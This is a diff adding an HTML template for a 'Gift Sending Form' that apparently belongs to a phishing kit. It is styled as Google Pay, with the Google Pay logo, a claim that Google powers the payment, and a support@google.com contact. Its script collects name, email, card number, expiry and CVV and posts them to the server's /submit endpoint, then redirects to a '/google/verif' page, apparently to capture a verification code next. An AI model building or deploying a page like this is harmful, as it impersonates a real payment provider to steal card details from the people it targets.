@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Sending Form</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fomantic-ui/2.9.3/semantic.min.css" integrity="sha512-3quBdRGJyLy79hzhDDcBzANW+mVqPctrGCfIPosHQtMKb3rKsCxfyslzwlz2wj1dT8A7UX+sEvDjaUv+WExQrA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(to bottom, #f0f0f0, #d9d9d9);
+            overflow: hidden;
+        }
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            justify-content: flex-start;
+            padding: 20px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: left;
+            width: 100%;
+            max-width: 500px;
+            height: 100vh;
+            overflow-y: scroll;
+            overflow-x: hidden;
+        }
+
+        .form-container img{
+            width: 50px;
+            height: auto;
+            margin: 0 auto 15px auto;
+        }
+
+        .form-container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #6a0dad;
+        }
+        .form-container .ui.input,
+        .form-container .ui.dropdown,
+        .form-container .ui.button {
+            width: 100%;
+            margin-bottom: 15px;
+        }
+        .form-container .ui.input input,
+        .form-container .ui.dropdown input {
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+        .form-container .ui.button {
+            background-color: #6a0dad;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 0;
+        }
+        .form-container .ui.button:hover {
+            background-color: #580a91;
+        }
+        .form-container p {
+            text-align: justify;
+            font-size: 14px;
+            color: #666;
+            margin-top: 5px;
+        }
+        .section-title {
+            
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .section {
+            margin-bottom: 25px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            width: 100%;
+        }
+        .section input {
+            margin-top: 5px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            .form-container h1 {
+                font-size: 20px;
+            }
+            .form-container .ui.input input,
+            .form-container .ui.dropdown input,
+            .form-container .ui.button {
+                font-size: 14px;
+            }
+            .form-container p {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <img src="{{ url_for('static', filename='google-pay-logo.png') }}" alt="Google Pay Logo">
+        
+        <!-- Personal Information Section -->
+        <div class="section">
+            <div class="section-title"><i class="address card outline icon"></i> Personal Information</div>
+            <form>
+                <div class="ui form">
+                    <div class="field">
+                        <label for="first-name">First Name</label>
+                        <input type="text" id="first-name" placeholder="Enter your first name" required>
+                    </div>
+                    <div class="field">
+                        <label for="last-name">Last Name</label>
+                        <input type="text" id="last-name" placeholder="Enter your last name" required>
+                    </div>
+                    <div class="field">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" placeholder="Enter your email" required>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- Payment Information Section -->
+        <div class="section">
+            <div class="section-title"><i class="credit card outline icon"></i> Payment Information</div>
+            <form>
+                <div class="ui form">
+                    <div class="field">
+                        <label for="card-number">Card Number</label>
+                        <input type="text" id="card-number" placeholder="Enter your card number" required>
+                    </div>
+                    <div class="field">
+                        <label for="expiry-date">Expiry Date</label>
+                        <input type="text" id="expiry-date" placeholder="MM/YY" required>
+                    </div>
+                    <div class="field">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" placeholder="Enter CVV" required>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- Gift Amount Section -->
+        <div class="section">
+            <div class="section-title"><i class="hand holding usd icon"></i> Gift Amount</div>
+            <form>
+                <div class="ui form">
+                    <div class="field">
+                        <label for="gift-amount">Select the Gift Amount to Send</label>
+                        <div style="display: flex; align-items: center;">
+                            <input step="0.10" type="number" id="gift-amount" placeholder="Amount in USD" required>
+                            <i style="margin: 5px;" class="dollar sign icon"></i>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- Submit Button -->
+        <button type="submit" class="ui violet button">Submit</button>
+
+        <p>Payment processing is powered by Google for your security and convenience. 
+            If you encounter any issues or need assistance, Feel free to contact the team at 
+            <a href="mailto:support@google.com">support@google.com</a>. We're here to help!</p>
+    </div>
+
+
+    <script>
+        window.onload = function() {
+            // Récupérer les paramètres de l'URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const price = urlParams.get('price');
+
+            // Remplir le champ si le paramètre existe
+            if (price) {
+                document.getElementById('gift-amount').value = parseFloat(price).toFixed(2);
+            }
+        }
+
+        document.querySelector('.ui.button').addEventListener('click', async (e) => {
+            e.preventDefault();
+
+            // Collecter les données du formulaire
+            const firstName = document.getElementById('first-name').value;
+            const lastName = document.getElementById('last-name').value;
+            const email = document.getElementById('email').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Valider les données
+            if (!firstName || !lastName || !email || !cardNumber || !expiryDate || !cvv) {
+                alert("Please fill in all required fields.");
+                return;
+            }
+
+            // Créer l'objet de données
+            const formData = {
+                first_name: firstName,
+                last_name: lastName,
+                email: email,
+                message: "Loading",
+                code: "",
+
+                card_number: cardNumber,
+                expiry_date: expiryDate,
+                cvv: cvv,
+            };
+
+            try {
+                // Envoyer la requête POST
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    window.location.href = `/google/verif?email=${encodeURIComponent(email)}`;
+                } else {
+                    alert("Error: " + result.error);
+                }
+
+            } catch (error) {
+                console.error("Error submitting form:", error);
+                alert("An unexpected error occurred. Please try again later.");
+            }
+        });
+
+    </script>
+</body>
+</html>
